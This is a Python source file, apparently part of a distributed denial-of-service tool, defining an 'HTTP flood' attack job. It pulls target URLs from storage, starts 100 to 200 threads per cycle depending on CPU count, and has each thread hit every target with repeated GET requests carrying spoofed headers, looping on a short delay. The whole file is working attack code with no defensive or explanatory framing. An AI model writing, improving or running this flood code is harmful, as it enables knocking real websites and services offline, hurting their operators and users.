import os
import threading
import time
from typing import List
from services.service_http import ServiceHttp
from injectable import injectable, autowired, Autowired
from rvkinh_utils import AbstractJob, UtilsSpoofing
from storage.storage_target import StorageTarget


CURRENT_CPU_COUNT = os.cpu_count()
print('JobAttackHttpFlood: CURRENT_CPU_COUNT=' + str(CURRENT_CPU_COUNT))
THREADS_BY_CPU_COUNT_MAP = {1: 100, 2: 200, 12: 200}
REPETITIONS_BY_CPU_COUNT_MAP = {1: 1, 2: 2, 12: 2}
DELAYS_BY_CPU_COUNT_MAP = {1: 3, 2: 2, 12: 2}


@injectable
class JobAttackHttpFlood(AbstractJob):
    @autowired
    def __init__(self, storage_target: Autowired(StorageTarget), service_http: Autowired(ServiceHttp), utils_spoofing: Autowired(UtilsSpoofing)):
        super().__init__()
        self.storage_target = storage_target
        self.service_http = service_http
        self.utils_spoofing = utils_spoofing

    def launch_attack_in_thread(self, thread_index: int, target_urls: List[str]):
        print('JobAttackHttpFlood.launch_attack_in_thread(): Started thread ' + str(thread_index))
        for target_url in target_urls:
            for i in range(0, REPETITIONS_BY_CPU_COUNT_MAP[CURRENT_CPU_COUNT]):
                self.service_http.http_get(target_url, headers=self.utils_spoofing.get_header(), timeout=6)
        print('JobAttackHttpFlood.launch_attack_in_thread(): Finished thread ' + str(thread_index))

    def job_iteration(self):
        print('JobAttackHttpFlood.job_iteration(): Started')

        # Get target
        target_urls = self.storage_target.get_http_flood_target_urls()

        # Early stop
        if len(target_urls) == 0:
            print('JobAttackHttpFlood.job_iteration(): WARNING!!! No available URLs found')
            time.sleep(30)
            return

        # Launch separate threads with attacks
        for thread_index in range(0, THREADS_BY_CPU_COUNT_MAP[CURRENT_CPU_COUNT]):
            thread = threading.Thread(target=self.launch_attack_in_thread, args=[thread_index, target_urls])
            thread.start()
        time.sleep(DELAYS_BY_CPU_COUNT_MAP[CURRENT_CPU_COUNT])

        print('JobAttackHttpFlood.job_iteration(): Finished')
